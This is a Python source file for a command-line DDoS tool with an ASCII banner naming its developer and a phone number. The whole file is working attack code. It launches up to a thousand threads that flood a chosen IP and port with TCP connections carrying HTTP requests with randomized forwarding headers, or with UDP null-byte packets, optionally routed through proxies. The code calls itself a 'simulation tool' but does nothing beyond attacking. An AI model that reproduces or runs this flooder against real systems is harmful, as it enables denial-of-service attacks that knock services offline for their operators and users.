import socket
import threading
import random
import time
import os
import argparse
from rich.console import Console
from rich.text import Text
console = Console()
class DDoSAttack:
    def __init__(self, target_ip, target_port, threads_count=1000, attack_type='TCP', proxies=None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads_count = threads_count
        self.attack_type = attack_type
        self.proxies = proxies if proxies else []

    def get_random_ip(self):
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def get_random_mac(self):
        return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

    def attack(self):
        while True:
            if self.attack_type.upper() == 'TCP':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if self.proxies:
                    proxy = random.choice(self.proxies)
                    try:
                        s.connect((proxy[0], proxy[1]))
                        s.sendto(f"CONNECT {self.target_ip}:{self.target_port} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n".encode(), (proxy[0], proxy[1]))
                    except Exception as e:
                        print(f"[!] Proxy error: {e}")
                        s.close()
                        continue
                else:
                    s.connect((self.target_ip, self.target_port))
            elif self.attack_type.upper() == 'UDP':
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            random_ip = self.get_random_ip()
            random_mac = self.get_random_mac()

            try:
                if self.attack_type.upper() == 'TCP':
                    request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random_ip}\r\nX-Forwarded-For: {random_ip}\r\nX-Client-IP: {random_ip}\r\nX-MAC: {random_mac}\r\n\r\n"
                    s.sendto(request.encode('ascii'), (self.target_ip, self.target_port))
                else:
                    s.sendto(b'\x00' * 1024, (self.target_ip, self.target_port)) 

                print(f"[*] Attack from {random_ip} (MAC: {random_mac}) to {self.target_ip}")
            except Exception as e:
                print(f"[!] Error: {e}")
            finally:
                s.close()

    def start_attack(self):
        for _ in range(self.threads_count):
            thread = threading.Thread(target=self.attack)
            thread.start()

        start_time = time.time()
        duration = 60  

        while True:
            elapsed_time = time.time() - start_time
            if elapsed_time > duration:
                print("[*] Attack completed.")
                os._exit(0)

def main():
    console.print(Text("""
                         ____  ____       ____  
                        |  _ \|  _ \  ___/ ___| 
                        | | | | | | |/ _ \___ \ 
                        | |_| | |_| | (_) |__) |
                        |____/|____/ \___/____/ 
                       --------------------------
                     Developed by: Ibrahem abo kila
                             +201020687061                          
        """, style="bold magenta"))
    parser = argparse.ArgumentParser(description="DDoS Attack Simulation Tool")
    parser.add_argument("-t", "--target", dest="target_ip", type=str, help="Target IP address", required=True)
    parser.add_argument("-p", "--port", dest="target_port", type=int, help="Target port", required=True)
    parser.add_argument("-n", "--threads", dest="threads_count", type=int, default=1000, help="Number of threads (default: 1000)")
    parser.add_argument("-a", "--attack", dest="attack_type", type=str, choices=['TCP', 'UDP'], help="Type of attack (TCP/UDP)", required=True)

    args = parser.parse_args()
    proxies = [
        ('proxy_ip1', 8080), 
        ('proxy_ip2', 8080), 
    ]

    attack = DDoSAttack(args.target_ip, args.target_port, args.threads_count, args.attack_type, proxies)
    attack.start_attack()
if __name__ == "__main__":
    main()